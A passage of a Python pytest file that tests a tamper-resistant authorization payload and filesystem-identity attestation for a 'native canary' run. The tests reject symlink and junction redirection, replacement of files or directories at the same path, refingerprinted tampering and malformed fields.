    data["payload_fingerprint"] = fingerprint({k: v for k, v in data.items() if k != "payload_fingerprint"})
    return data


def _rebuild(data: dict) -> NativeCanaryAuthorizationPayload:
    return NativeCanaryAuthorizationPayload.from_dict(data)


def _owner_digest(phrase: str, payload: NativeCanaryAuthorizationPayload) -> str:
    return hashlib.sha256(phrase.encode("utf-8") + b"\0" + _canonical_bytes(payload.to_dict())).hexdigest()


def test_v3_round_trip_and_deterministic_fingerprint(tmp_path: Path):
    _s, run_root, _a, payload = _v3_payload(tmp_path)
    assert payload.schema_version == AUTHORIZATION_SCHEMA_VERSION == "admissible_native_canary_authorization_v3"
    twin_base = tmp_path / "twin"; twin_base.mkdir()
    _s2, _rr2, _a2, again = _v3_payload(twin_base)
    twin_root = tmp_path / "twin" / _V3_RUN_ID
    assert again.run_root == str(twin_root)
    reloaded = _rebuild(payload.to_dict()).validated()
    assert reloaded == payload and reloaded.payload_fingerprint == payload.payload_fingerprint
    assert not run_root.exists()


def test_v3_exact_proposed_run_validates_and_binds_roots(tmp_path: Path):
    _s, run_root, _a, payload = _v3_payload(tmp_path)
    assert payload.run_id == payload.session_id == _V3_RUN_ID
    assert payload.workspace_root == str(run_root / WORKSPACE_DIRECTORY_NAME)
    assert payload.evidence_root == str(run_root / EVIDENCE_DIRECTORY_NAME)
    assert payload.native_sidecar_root == str(run_root / EVIDENCE_DIRECTORY_NAME / NATIVE_SIDECAR_DIRECTORY_NAME)
    assert payload.backend_readiness_reason == WRAPPER_CHAIN_READY_REASON
    assert payload.backend_attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert tuple(payload.canary_non_claims) == CANARY_NON_CLAIMS
    payload.validated()


def test_v2_schema_cannot_authorize_new_live_path(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    downgraded = _refingerprint({**payload.to_dict(), "schema_version": AUTHORIZATION_SCHEMA_VERSION_LEGACY_V2})
    with pytest.raises(ValueError):
        _rebuild(downgraded).validated()


@pytest.mark.parametrize("reason", ["", PACKAGE_BIN_READY_REASON, "SOME_UNKNOWN_REASON"])
def test_missing_or_mismatched_readiness_reason_rejected(tmp_path: Path, reason: str):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    altered = _refingerprint({**payload.to_dict(), "backend_readiness_reason": reason})
    with pytest.raises(ValueError):
        _rebuild(altered).validated()


@pytest.mark.parametrize("field", ["workspace_root", "native_sidecar_root", "evidence_root"])
def test_changed_bound_root_rejected_even_when_refingerprinted(tmp_path: Path, field: str):
    _s, run_root, _a, payload = _v3_payload(tmp_path)
    altered = _refingerprint({**payload.to_dict(), field: str(run_root / "elsewhere")})
    with pytest.raises(ValueError):
        _rebuild(altered).validated()


def test_run_root_inside_source_repository_rejected(tmp_path: Path):
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    source = tmp_path / "source-repo"; source.mkdir()
    with pytest.raises(ValueError):
        build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
            attestation=attestation, run_root=source / _V3_RUN_ID, timeout_seconds=900,
        )


@pytest.mark.parametrize("index", range(len(CANARY_NON_CLAIMS)))
def test_each_canary_non_claim_mutation_rejected(tmp_path: Path, index: int):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    mutated = list(CANARY_NON_CLAIMS)
    mutated[index] = mutated[index] + " (tampered)"
    altered = _refingerprint({**payload.to_dict(), "canary_non_claims": mutated})
    with pytest.raises(ValueError):
        _rebuild(altered).validated()


def test_reordered_and_resized_canary_non_claims_rejected(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    reordered = list(CANARY_NON_CLAIMS)
    reordered[0], reordered[1] = reordered[1], reordered[0]
    with pytest.raises(ValueError):
        _rebuild(_refingerprint({**payload.to_dict(), "canary_non_claims": reordered})).validated()
    dropped = list(CANARY_NON_CLAIMS)[:-1]
    with pytest.raises(ValueError):
        _rebuild(_refingerprint({**payload.to_dict(), "canary_non_claims": dropped})).validated()
    added = list(CANARY_NON_CLAIMS) + ["os sandboxing is guaranteed"]
    with pytest.raises(ValueError):
        _rebuild(_refingerprint({**payload.to_dict(), "canary_non_claims": added})).validated()


def test_payload_fingerprint_and_owner_digest_change_when_new_fields_change(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    phrase = "one-time-random-owner-phrase"
    baseline_digest = _owner_digest(phrase, payload)
    alt_base = tmp_path / "alt"; alt_base.mkdir()
    _s2, _rr2, _a2, other = _v3_payload(alt_base)
    assert other.payload_fingerprint != payload.payload_fingerprint
    assert _owner_digest(phrase, other) != baseline_digest
    mutated = _refingerprint({**payload.to_dict(), "canary_non_claims": [c + "!" for c in CANARY_NON_CLAIMS]})
    assert mutated["payload_fingerprint"] != payload.payload_fingerprint


def test_owner_authorization_binds_full_v3_payload(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    phrase = "one-time-random-owner-phrase"
    monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256", _owner_digest(phrase, payload))
    assert _authorized(phrase, payload, active_source_repository=_s) and not _authorized("wrong", payload, active_source_repository=_s)
    for field, value in (
        ("workspace_root", str(_rr / "other")),
        ("native_sidecar_root", str(_rr / EVIDENCE_DIRECTORY_NAME / "other")),
    ):
        with pytest.raises(ValueError):
            _rebuild(_refingerprint({**payload.to_dict(), field: value}))


def test_preflight_only_payload_exposes_every_new_field(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    emitted = payload.to_dict()
    for key in (
        "backend_attestation_class", "backend_readiness_reason", "attestation_non_claims",
        "canary_non_claims", "run_root", "workspace_root", "evidence_root", "native_sidecar_root",
    ):
        assert key in emitted, key
    assert emitted["canary_non_claims"] == list(CANARY_NON_CLAIMS)


# --- Act 2A.3A authorization authority repair --------------------------------

def _source_identity_dict(path: Path) -> dict[str, int]:
    return NativeFilesystemIdentity.from_stat(os.lstat(path)).validated().to_dict()


def _refingerprinted_source(payload: NativeCanaryAuthorizationPayload, source: Path) -> dict:
    return _refingerprint({
        **payload.to_dict(),
        "source_repository": str(source),
        "source_repository_identity": _source_identity_dict(source),
    })


def test_v3_source_path_is_structural_then_rebound_to_active_authority(tmp_path: Path):
    source, _rr, _a, payload = _v3_payload(tmp_path, run_root=tmp_path.parent / "outside-run")
    assert payload.validated_for_authorization(active_source_repository=source) is payload

    alternate = _refingerprint({**payload.to_dict(), "source_repository": str(source) + "\\."})
    with pytest.raises(ValueError, match="canonical"):
        NativeCanaryAuthorizationPayload.from_dict(alternate)
    alternate_separator = _refingerprint({**payload.to_dict(), "source_repository": str(source).replace("\\", "/")})
    with pytest.raises(ValueError, match="canonical"):
        NativeCanaryAuthorizationPayload.from_dict(alternate_separator)

    other = tmp_path / "other-canonical-directory"; other.mkdir()
    substituted = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, other))
    with pytest.raises(ValueError, match="active source"):
        substituted.validated_for_authorization(active_source_repository=source)

    parent = source.parent
    parent_payload = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, parent))
    with pytest.raises(ValueError, match="active source"):
        parent_payload.validated_for_authorization(active_source_repository=source)


def test_v3_source_another_git_repository_and_same_commit_clone_fail_authority(tmp_path: Path):
    left_parent = tmp_path / "left-parent"; left_parent.mkdir()
    right_parent = tmp_path / "right-parent"; right_parent.mkdir()
    source = build_canary_repository(left_parent, repository_name="source").repository
    same_commit_clone = build_canary_repository(right_parent, repository_name="clone").repository
    assert _command(["git", "rev-parse", "HEAD"], cwd=source).stdout == _command(["git", "rev-parse", "HEAD"], cwd=same_commit_clone).stdout
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    payload = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
        attestation=attestation, run_root=tmp_path.parent / "outside-git-run", timeout_seconds=900,
    )
    clone_payload = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, same_commit_clone))
    with pytest.raises(ValueError, match="active source"):
        clone_payload.validated_for_authorization(active_source_repository=source)


def test_v3_source_symlink_or_junction_alias_is_rejected_structurally(tmp_path: Path):
    source, _rr, _a, payload = _v3_payload(tmp_path, run_root=tmp_path.parent / "outside-link-run")
    alias = tmp_path / "source-alias"
    try:
        os.symlink(source, alias, target_is_directory=True)
    except (OSError, NotImplementedError):
        if os.name != "nt":
            pytest.skip("directory symlink creation unavailable")
        completed = subprocess.run(["cmd.exe", "/d", "/c", "mklink", "/J", str(alias), str(source)], shell=False, capture_output=True)
        if completed.returncode != 0:
            pytest.skip("junction creation unavailable")
    raw = _refingerprint({**payload.to_dict(), "source_repository": str(alias)})
    with pytest.raises(ValueError, match="redirecting"):
        NativeCanaryAuthorizationPayload.from_dict(raw)


def test_v3_source_identity_replacement_fails_before_authority(tmp_path: Path):
    source, _rr, _a, payload = _v3_payload(tmp_path)
    displaced = tmp_path / "displaced-source"
    source.rename(displaced); source.mkdir()
    with pytest.raises(ValueError, match="identity changed"):
        NativeCanaryAuthorizationPayload.from_dict(payload.to_dict())


@pytest.mark.parametrize("missing", tuple(NativeCanaryAuthorizationPayload.__dataclass_fields__))
def test_v3_from_dict_rejects_every_missing_key(tmp_path: Path, missing: str):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    raw = payload.to_dict(); raw.pop(missing)
    with pytest.raises(ValueError, match="keys"):
        NativeCanaryAuthorizationPayload.from_dict(raw)


def test_v3_from_dict_rejects_unknown_and_malformed_json_arrays(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    unknown = payload.to_dict(); unknown["unexpected"] = "authority expansion"
    with pytest.raises(ValueError, match="keys"):
        NativeCanaryAuthorizationPayload.from_dict(unknown)
    for key, value in (
        ("budgets", "11000"),
        ("budgets", [1, 1, 0, 0]),
        ("budgets", [1, True, 0, 0, 0]),
        ("launcher_prefix", "not-an-array"),
        ("launcher_prefix", [payload.launcher_prefix[0], payload.launcher_prefix[0]]),
        ("attestation_non_claims", "not-an-array"),
        ("canary_non_claims", [CANARY_NON_CLAIMS[0], CANARY_NON_CLAIMS[0]]),
    ):
        raw = _refingerprint({**payload.to_dict(), key: value})
        with pytest.raises(ValueError):
            NativeCanaryAuthorizationPayload.from_dict(raw)


def test_authorization_revalidates_before_digest_comparison(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    import admissible.delegated_gate.native_canary as native_canary_module

    source, _rr, _a, payload = _v3_payload(tmp_path)
    phrase = "synthetic-unit-test-phrase"
    monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256", _owner_digest(phrase, payload))
    compared: list[tuple[str, str]] = []
    monkeypatch.setattr(native_canary_module.hmac, "compare_digest", lambda left, right: compared.append((left, right)) or left == right)

    malformed = replace(payload, budgets=(1,))
    assert not _authorized(phrase, malformed, active_source_repository=source)
    wrong_claims = replace(payload, canary_non_claims=("canary is a sandbox",))
    assert not _authorized(phrase, wrong_claims, active_source_repository=source)
    other = tmp_path / "other"; other.mkdir()
    substituted = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, other))
    assert not _authorized(phrase, substituted, active_source_repository=source)
    assert compared == []

    assert _authorized(phrase, payload, active_source_repository=source)
    assert len(compared) == 1
    assert not _authorized(phrase, malformed, active_source_repository=source)
    assert len(compared) == 1


def test_cli_missing_or_incorrect_synthetic_authorization_has_zero_run_effect(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h = _harness(tmp_path)
    head = _command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip()
    run_root = tmp_path / "cli-future-run"
    decision = NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY, "LOCAL_CURSOR_CAPABILITIES_ATTESTED", "synthetic test preflight", h.attestation)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.preflight_native_cursor", lambda *, config: decision)
    args = ["--source-repository", str(h.source), "--required-source-head", head, "--run-root", str(run_root), "--run-id", "cli-future-run", "--session-id", h.session_id, "--executable", h.config.executable, "--executable-prefix-arg", h.config.launcher_prefix[0], "--timeout-seconds", "30"]
    assert main(args) == 2
    assert not run_root.exists() and h.runner.invocations == []
    monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256", "0" * 64)
    assert main([*args, "--owner-authorization", "synthetic-unit-test-phrase"]) == 2
    assert not run_root.exists() and h.runner.invocations == []
    assert all(json.loads(line)["status"] == NativeCanaryStatus.PREFLIGHT_BLOCKED.value for line in capsys.readouterr().out.splitlines())


def test_cli_preflight_only_rebinds_source_and_exposes_complete_payload_without_run_effect(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h = _harness(tmp_path)
    head = _command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip()
    run_root = tmp_path / "preflight-future-run"
    decision = NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY, "LOCAL_CURSOR_CAPABILITIES_ATTESTED", "synthetic test preflight", h.attestation)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.preflight_native_cursor", lambda *, config: decision)
    args = ["--source-repository", str(h.source), "--required-source-head", head, "--run-root", str(run_root), "--run-id", "preflight-future-run", "--session-id", h.session_id, "--executable", h.config.executable, "--executable-prefix-arg", h.config.launcher_prefix[0], "--timeout-seconds", "30", "--preflight-only"]
    assert main(args) == 0
    emitted = json.loads(capsys.readouterr().out)
    payload = emitted["authorization_payload"]
    for key in NativeCanaryAuthorizationPayload.__dataclass_fields__:
        assert key in payload
    assert payload["source_repository"] == str(h.source)
    assert not run_root.exists() and h.runner.invocations == []


# --- Act 2A.3C: deterministic directory identity normalization -------------

class _StatOverride:
    def __init__(self, metadata: os.stat_result, **overrides: int) -> None:
        self._metadata = metadata
        self._overrides = overrides

    def __getattr__(self, name: str) -> object:
        if name in self._overrides:
            return self._overrides[name]
        return getattr(self._metadata, name)


def _override_lstat(monkeypatch: pytest.MonkeyPatch, rules: dict[Path, object]) -> None:
    original = os.lstat
    normalized = {os.path.normcase(os.path.abspath(os.fspath(path))): rule for path, rule in rules.items()}
    calls = {key: 0 for key in normalized}

    def observed(path: str | bytes | Path, *args: object, **kwargs: object) -> os.stat_result:
        metadata = original(path, *args, **kwargs)
        key = os.path.normcase(os.path.abspath(os.fsdecode(path)))
        rule = normalized.get(key)
        if rule is None:
            return metadata
        index = calls[key]
        calls[key] += 1
        overrides = rule(index, metadata) if callable(rule) else rule
        return _StatOverride(metadata, **overrides)  # type: ignore[return-value, arg-type]

    monkeypatch.setattr(os, "lstat", observed)


def _alternating_directory_size(index: int, _metadata: os.stat_result) -> dict[str, int]:
    values = (0, 4096, 8192, 40960, 12345)
    return {"st_size": values[index % len(values)]}


def test_directory_identity_normalizes_alternating_raw_sizes_and_rejects_noncanonical_json(tmp_path: Path):
    directory = tmp_path / "directory"; directory.mkdir()
    metadata = os.lstat(directory)
    identities = tuple(
        NativeFilesystemIdentity.from_stat(_StatOverride(metadata, st_size=size))
        for size in (0, 4096, 8192, 40960, 12345)
    )
    assert all(item.entry_kind == "DIRECTORY" and item.size == 0 for item in identities)
    assert len({json.dumps(item.to_dict(), sort_keys=True) for item in identities}) == 1
    assert len({fingerprint(item.to_dict()) for item in identities}) == 1
    noncanonical = identities[0].to_dict(); noncanonical["size"] = 40960
    with pytest.raises(ValueError, match="canonical zero"):
        NativeFilesystemIdentity.from_dict(noncanonical)


def test_directory_identity_binds_metadata_and_rejects_entry_kind_substitution(tmp_path: Path):
    directory = tmp_path / "directory"; directory.mkdir()
    regular_file = tmp_path / "regular.txt"; regular_file.write_text("regular", encoding="utf-8")
    identity = _test_identity(directory)
    changed_directory_mode = identity.mode ^ stat.S_IWUSR
    if not stat.S_ISDIR(changed_directory_mode):
        changed_directory_mode = identity.mode ^ stat.S_IRUSR
    variants = (
        replace(identity, device=identity.device + 1),
        replace(identity, inode=identity.inode + 1),
        replace(identity, mode=changed_directory_mode),
        replace(identity, file_attributes=identity.file_attributes ^ 0x2),
        replace(identity, mtime_ns=identity.mtime_ns + 1),
    )
    assert all(not _same_directory_identity(identity, variant) for variant in variants)
    file_identity = _test_identity(regular_file)
    with pytest.raises(ValueError, match="requires directories"):
        _same_directory_identity(identity, file_identity)
    with pytest.raises(ValueError, match="requires directories"):
        _same_directory_identity(file_identity, identity)
    unsupported = replace(identity, mode=stat.S_IFIFO)
    with pytest.raises(ValueError, match="unsupported"):
        unsupported.validated()


@pytest.mark.parametrize(
    ("metadata_field", "identity_field"),
    (
        ("st_dev", "device"),
        ("st_ino", "inode"),
        ("st_mode", "mode"),
        ("st_file_attributes", "file_attributes"),
        ("st_mtime_ns", "mtime_ns"),
    ),
)
def test_regular_file_metadata_mutation_blocks_fresh_file_attestation_and_outer_refingerprint(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, metadata_field: str, identity_field: str,
):
    config, attestor = _injected_test_cursor(tmp_path)
    outer_attestation = attestor(config)
    authority = outer_attestation.executable
    path = Path(authority.canonical_path)
    original_metadata = os.lstat(path)
    original_identity = authority.filesystem_identity

    assert authority.validated() is authority
    assert outer_attestation.validated() is outer_attestation
    assert stat.S_ISREG(original_metadata.st_mode)
    assert original_identity == NativeFilesystemIdentity.from_stat(original_metadata)
    assert authority.byte_count == original_identity.size == int(original_metadata.st_size)
    assert authority.sha256 == hashlib.sha256(path.read_bytes()).hexdigest()

    def altered(_index: int, metadata: os.stat_result) -> dict[str, int]:
        value = int(getattr(metadata, metadata_field, 0))
        if metadata_field == "st_mode":
            changed_mode = value ^ stat.S_IWUSR
            assert stat.S_ISREG(changed_mode)
            return {metadata_field: changed_mode}
        if metadata_field == "st_file_attributes":
            return {metadata_field: value ^ 0x2}
        return {metadata_field: value + 1}

    _override_lstat(monkeypatch, {path: altered})
    fresh_identity = NativeFilesystemIdentity.from_stat(os.lstat(path))

    assert authority.canonical_path == str(path)
    assert fresh_identity.entry_kind == "REGULAR_FILE"
    assert fresh_identity.size == authority.byte_count == int(original_metadata.st_size)
    assert authority.sha256 == hashlib.sha256(path.read_bytes()).hexdigest()
    changed_fields = tuple(
        field for field in ("device", "inode", "mode", "file_attributes", "mtime_ns", "size")
        if getattr(fresh_identity, field) != getattr(original_identity, field)
    )
    assert changed_fields == (identity_field,)

    with pytest.raises(ValueError, match="identity changed"):
        authority.validated()
    provisional = replace(outer_attestation, attestation_fingerprint="0" * 64)
    refingerprinted = replace(
        provisional, attestation_fingerprint=fingerprint(provisional._body()),
    )
    with pytest.raises(ValueError, match="identity changed"):
        refingerprinted.validated()


def test_regular_file_identity_retains_exact_size_hash_and_substitution_authority(tmp_path: Path):
    path = tmp_path / "authority.bin"; path.write_bytes(b"aa")
    original = NativeBackendFileAttestation.observe(path, "regular authority")
    path.write_bytes(b"bb")
    same_size_changed_content = NativeBackendFileAttestation.observe(path, "changed regular authority")
    assert same_size_changed_content.filesystem_identity.size == original.filesystem_identity.size == 2
    assert same_size_changed_content.sha256 != original.sha256
    with pytest.raises(ValueError):
        original.validated()
    path.write_bytes(b"longer")
    changed_size = NativeBackendFileAttestation.observe(path, "resized regular authority")
    assert changed_size.filesystem_identity.size != original.filesystem_identity.size
    displaced = tmp_path / "displaced.bin"; path.rename(displaced); path.write_bytes(b"longer")
    with pytest.raises(ValueError):
        changed_size.validated()


def test_same_path_regular_file_replaced_by_directory_fails_fresh_file_authority(tmp_path: Path):
    path = tmp_path / "same-path-entry"
    path.write_bytes(b"regular authority")
    authority = NativeBackendFileAttestation.observe(path, "same-path regular file")
    assert authority.filesystem_identity.entry_kind == "REGULAR_FILE"

    path.unlink()
    path.mkdir()
    assert stat.S_ISDIR(os.lstat(path).st_mode)
    with pytest.raises(ValueError, match="regular file"):
        authority.validated()


def test_same_path_directory_replaced_by_regular_file_fails_fresh_request_authority(tmp_path: Path):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    assert request.work_workspace_identity.entry_kind == "DIRECTORY"

    displaced = h.work.with_name("displaced-workspace")
    h.work.rename(displaced)
    h.work.write_bytes(b"regular replacement at the authoritative directory path")
    assert stat.S_ISREG(os.lstat(h.work).st_mode)
    with pytest.raises(ValueError, match="directory"):
        request.validated()


@pytest.mark.parametrize("target_kind", ("regular-file", "directory"))
def test_direct_symlink_entry_never_becomes_authority(tmp_path: Path, target_kind: str):
    target = tmp_path / f"{target_kind}-target"
    link = tmp_path / f"{target_kind}-link"
    if target_kind == "regular-file":
        target.write_bytes(b"target")
        target_is_directory = False
    else:
        target.mkdir()
        target_is_directory = True
    try:
        os.symlink(target, link, target_is_directory=target_is_directory)
    except (OSError, NotImplementedError):
        pytest.skip(f"{target_kind} symlink creation unavailable")

    if target_kind == "regular-file":
        with pytest.raises(ValueError, match="redirecting"):
            NativeBackendFileAttestation.observe(link, "redirecting regular file")
    else:
        with pytest.raises(ValueError, match="redirecting"):
            _safe_directory(link, "redirecting directory")


def test_redirecting_entry_replacing_prior_plain_file_fails_fresh_authority(tmp_path: Path):
    path = tmp_path / "authoritative-file"
    target = tmp_path / "replacement-target"
    path.write_bytes(b"original")
    target.write_bytes(b"replacement")
    authority = NativeBackendFileAttestation.observe(path, "plain regular authority")
    path.unlink()
    try:
        os.symlink(target, path, target_is_directory=False)
    except (OSError, NotImplementedError):
        pytest.skip("regular-file symlink creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        authority.validated()


def test_windows_junction_replacing_prior_plain_directory_fails_fresh_authority(tmp_path: Path):
    if os.name != "nt":
        pytest.skip("Windows junction regression")
    path = tmp_path / "authoritative-directory"
    target = tmp_path / "junction-target"
    path.mkdir(); target.mkdir()
    _plain, authority = _safe_directory(path, "plain directory authority")
    path.rmdir()
    completed = subprocess.run(
        ["cmd.exe", "/d", "/c", "mklink", "/J", str(path), str(target)],
        shell=False, capture_output=True,
    )
    if completed.returncode != 0:
        pytest.skip("Windows junction creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _safe_directory(path, "junction replacement")
    assert authority.entry_kind == "DIRECTORY"


def test_regular_file_zero_and_40960_sizes_are_exact_and_noninterchangeable(tmp_path: Path):
    empty = tmp_path / "empty.bin"; empty.write_bytes(b"")
    large = tmp_path / "large.bin"; large.write_bytes(b"x" * 40960)
    empty_authority = NativeBackendFileAttestation.observe(empty, "empty regular file")
    large_authority = NativeBackendFileAttestation.observe(large, "40960-byte regular file")

    assert empty_authority.filesystem_identity.entry_kind == "REGULAR_FILE"
    assert large_authority.filesystem_identity.entry_kind == "REGULAR_FILE"
    assert empty_authority.byte_count == empty_authority.filesystem_identity.size == 0
    assert large_authority.byte_count == large_authority.filesystem_identity.size == 40960
    same_other_fields = replace(empty_authority.filesystem_identity, size=40960)
    assert same_other_fields != empty_authority.filesystem_identity
    assert same_other_fields.entry_kind == "REGULAR_FILE"
    assert same_other_fields.to_dict()["size"] == 40960
    assert NativeFilesystemIdentity.from_stat(os.lstat(empty)).size == 0
    assert NativeFilesystemIdentity.from_stat(os.lstat(large)).size == 40960


@pytest.mark.parametrize("false_direction", ("smaller", "larger"))
@pytest.mark.parametrize("sha_mode", ("matching-content", "altered"))
def test_self_refingerprinted_wrapper_file_false_size_fails_fresh_authority(
    tmp_path: Path, false_direction: str, sha_mode: str,
):
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    raw = attestation.to_dict()
    executable = raw["executable"]
    actual_size = executable["filesystem_identity"]["size"]
    false_size = actual_size - 1 if false_direction == "smaller" else actual_size + 1
    executable["filesystem_identity"]["size"] = false_size
    executable["byte_count"] = false_size
    if sha_mode == "altered":
        executable["sha256"] = "0" * 64
    raw["attestation_fingerprint"] = fingerprint({
        key: value for key, value in raw.items() if key != "attestation_fingerprint"
    })
    with pytest.raises(ValueError, match="identity changed"):
        attestation_from_dict(raw)


def test_mutable_root_lifecycle_allows_expected_children_and_forced_mtime_changes(tmp_path: Path):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    _evidence_parent, evidence_parent_identity = _safe_directory(h.evidence, "test evidence parent")
    recorded = (
        (h.work, request.work_workspace_identity),
        (h.store.directory, request.evidence_store_identity),
        (h.store.artifact_directory, request.artifact_directory_identity),
        (h.evidence, evidence_parent_identity),
    )

    (h.work / "expected-work-child").mkdir()
    (h.work / "expected-work-child" / "draft.txt").write_text("expected", encoding="utf-8")
    (h.store.directory / "expected-sidecar-child.json").write_text("{}\n", encoding="utf-8")
    (h.store.artifact_directory / "expected-artifact.bin").write_bytes(b"expected")
    (h.evidence / "expected-evidence-child").mkdir()
    for path, identity in recorded:
        forced_mtime = identity.mtime_ns + 2_000_000_000
        os.utime(path, ns=(forced_mtime, forced_mtime))
        _fresh_path, fresh_identity = _safe_directory(path, f"fresh mutable {path.name}")
        assert fresh_identity.mtime_ns != identity.mtime_ns
        assert _same_mutable_directory_entry(identity, fresh_identity)
        assert fresh_identity.size == 0

    assert request.validated() is request
    h.store._assert_root_identity()
    h.store._assert_artifact_root_identity()


@pytest.mark.parametrize("role", ("workspace", "evidence-root", "artifact-root"))
def test_mutable_authority_rejects_same_path_physical_root_replacement(tmp_path: Path, role: str):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    path = {
        "workspace": h.work,
        "evidence-root": h.store.directory,
        "artifact-root": h.store.artifact_directory,
    }[role]
    displaced = path.with_name(f"displaced-{path.name}")
    path.rename(displaced)
    path.mkdir()
    if role == "evidence-root":
        (path / "artifacts").mkdir()
    with pytest.raises(ValueError, match="identity changed"):
        request.validated()


def test_mutable_workspace_sibling_substitution_fails_even_when_request_is_refingerprinted(tmp_path: Path):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    sibling = tmp_path / "workspace-sibling"; sibling.mkdir()
    substituted = replace(request, work_workspace=str(sibling), request_fingerprint="0" * 64)
    substituted = replace(substituted, request_fingerprint=fingerprint(substituted._body()))
    with pytest.raises(ValueError, match="identity changed"):
        substituted.validated()


def test_canary_parent_same_path_replacement_fails_exact_production_comparison(tmp_path: Path):
    parent = tmp_path / "canary-parent"; parent.mkdir()
    _path, authority = _safe_directory(parent, "canary parent authority")
    displaced = tmp_path / "displaced-canary-parent"
    parent.rename(displaced); parent.mkdir()
    _fresh_path, fresh = _safe_directory(parent, "replacement canary parent")
    assert not _same_directory_identity(authority, fresh)


def test_mutable_workspace_junction_replacement_fails_before_comparison(tmp_path: Path):
    if os.name != "nt":
        pytest.skip("Windows junction regression")
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    displaced = h.work.with_name("junction-workspace-target")
    h.work.rename(displaced)
    completed = subprocess.run(
        ["cmd.exe", "/d", "/c", "mklink", "/J", str(h.work), str(displaced)],
        shell=False, capture_output=True,
    )
    if completed.returncode != 0:
        pytest.skip("Windows junction creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        request.validated()


@pytest.mark.parametrize("role", ("source", "wrapper", "selected-version", "mutable-execution-root"))
def test_raw_directory_size_matrix_is_independent_for_every_authority_role(tmp_path: Path, role: str):
    wrapper_root = _wrapper_chain_installation(tmp_path)
    paths = {
        "source": tmp_path / "source",
        "wrapper": wrapper_root,
        "selected-version": wrapper_root / "versions" / "2026.07.09-a3815c0",
        "mutable-execution-root": tmp_path / "mutable-execution-root",
    }
    paths["source"].mkdir(); paths["mutable-execution-root"].mkdir()
    metadata = os.lstat(paths[role])
    identities = tuple(
        NativeFilesystemIdentity.from_stat(_StatOverride(metadata, st_size=size))
        for size in (0, 4096, 8192, 40960, 12345)
    )
    assert all(identity.entry_kind == "DIRECTORY" and identity.size == 0 for identity in identities)
    assert len(set(identities)) == 1
    assert _same_mutable_directory_entry(identities[0], identities[-1])


def test_v3_source_directory_raw_size_is_normalized_but_git_checks_remain_independent(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    source_parent = tmp_path / "source-parent"; source_parent.mkdir()
    source = build_canary_repository(source_parent, repository_name="source").repository
    head = _command(["git", "rev-parse", "HEAD"], cwd=source).stdout.strip()
    _wrapper_root, _discovery, attestation = _wrapper_attestation(tmp_path)
    _override_lstat(monkeypatch, {source: _alternating_directory_size})
    payloads = tuple(
        build_authorization_payload(
            source_repository=source, source_head=head, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
            attestation=attestation, run_root=tmp_path / _V3_RUN_ID, timeout_seconds=900,
        )
        for _ in range(4)
    )
    assert len({item.payload_fingerprint for item in payloads}) == 1
    assert all(item.source_repository_identity.size == 0 for item in payloads)
    noncanonical = payloads[0].to_dict(); noncanonical["source_repository_identity"]["size"] = 40960
    with pytest.raises(ValueError, match="canonical zero"):
        NativeCanaryAuthorizationPayload.from_dict(noncanonical)
    assert _git_source_preflight(source, "f" * 40)[0] is False
    assert _git_source_preflight(source, head)[0] is True
    (source / "dirty.txt").write_text("dirty", encoding="utf-8")
    assert _git_source_preflight(source, head)[0] is False


def test_wrapper_chain_directory_raw_sizes_do_not_change_attestation(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    wrapper_root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(wrapper_root)
    selected_root = wrapper_root / "versions" / "2026.07.09-a3815c0"
    _override_lstat(monkeypatch, {
        wrapper_root: _alternating_directory_size,
        selected_root: _alternating_directory_size,
    })
    attestations = tuple(_attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery) for _ in range(6))
    assert len({item.attestation_fingerprint for item in attestations}) == 1
    assert all(item.command_resolution.wrapper_root_identity.size == 0 for item in attestations)
    assert all(item.selected_version_root_identity.size == 0 for item in attestations)
    for identity_path in (
